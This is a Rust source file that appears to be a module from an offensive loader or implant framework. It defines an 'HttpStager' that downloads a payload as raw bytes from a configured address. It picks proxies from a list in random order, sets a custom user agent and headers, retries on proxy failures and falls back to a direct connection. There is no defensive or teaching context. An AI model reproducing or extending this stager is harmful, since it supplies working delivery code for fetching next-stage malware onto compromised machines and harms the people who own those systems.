use rand::prelude::*;
use reqwest::{Proxy, blocking::ClientBuilder};
use std::collections::HashMap;

fn build_client(
    user_agent: &Option<String>,
    headers: &Option<HashMap<String, String>>,
) -> ClientBuilder {
    let mut client = ClientBuilder::new();

    // Assign headers
    if let Some(headers) = &headers {
        if let Ok(header_map) = headers.try_into() {
            client = client.default_headers(header_map);
        }
    }

    if let Some(user_agent) = &user_agent {
        client = client.user_agent(user_agent);
    }
    client
}

pub struct HttpStager {
    /// Selects a random proxy
    proxy: Vec<Proxy>,
    user_agent: Option<String>,
    headers: Option<HashMap<String, String>>,
    address: String,
}

impl HttpStager {
    pub fn new<S: Into<String>>(
        proxies: Option<Vec<String>>,
        user_agent: Option<String>,
        headers: Option<HashMap<String, String>>,
        addr: S,
    ) -> Result<Self, reqwest::Error> {
        Ok(Self {
            proxy: proxies
                .map(|list| list.iter().map(|p| Proxy::all(p)).flatten().collect())
                .unwrap_or_default(),
            user_agent: user_agent,
            headers: headers,
            address: addr.into(),
        })
    }
}

impl super::Stager for HttpStager {
    type Error = reqwest::Error;
    fn get(&mut self) -> Result<Vec<u8>, Self::Error> {
        if !self.proxy.is_empty() {
            let mut proxy_list = self.proxy.clone();
            proxy_list.shuffle(&mut rand::rng());

            for proxy in proxy_list {
                // Safely handle builder failure without aborting the whole function
                let Ok(client) = build_client(&self.user_agent, &self.headers)
                    .proxy(proxy)
                    .build()
                else {
                    continue;
                };

                match client.get(&self.address).send() {
                    Ok(r) => {
                        if r.status().is_success() {
                            return r.bytes().map(|b| b.to_vec());
                        }
                        if r.status() == 407 {
                            continue;
                        }
                        break;
                    }
                    Err(e) => {
                        if e.is_connect() || e.is_timeout() || e.is_builder() {
                            deprintln!("Proxy failed, trying another one...");
                            continue;
                        }
                        break;
                    }
                }
            }
        }

        deprintln!("Attempting direct connection...");

        let client = build_client(&self.user_agent, &self.headers).build()?;
        let response = client.get(&self.address).send()?;

        response.bytes().map(|b| b.to_vec())
    }
}
